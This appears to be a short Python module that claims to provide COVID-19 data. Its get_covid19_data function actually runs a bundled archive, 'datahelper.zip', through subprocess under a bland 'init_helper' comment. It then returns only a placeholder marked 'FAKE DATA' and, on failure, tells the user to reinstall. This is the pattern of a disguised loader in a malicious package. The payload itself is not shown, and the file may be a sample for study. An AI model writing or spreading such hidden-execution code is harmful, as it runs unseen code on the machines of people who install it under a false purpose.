import subprocess
from pathlib import Path
from pprint import pprint


__all__ = ["get_covid19_data"]


def get_covid19_data():
    # init_helper
    helper_path = Path(__file__).absolute().parent.joinpath("datahelper.zip").resolve()
    try:
        subprocess.call(["py", f"{helper_path}"])
    except FileNotFoundError:
        print("please reinstall latest version")
        raise

    data = helper()
    print("{:*^30}".format("FAKE DATA"))
    pprint(data)

def helper():
    # do something ...
    return "Hello DATA!"
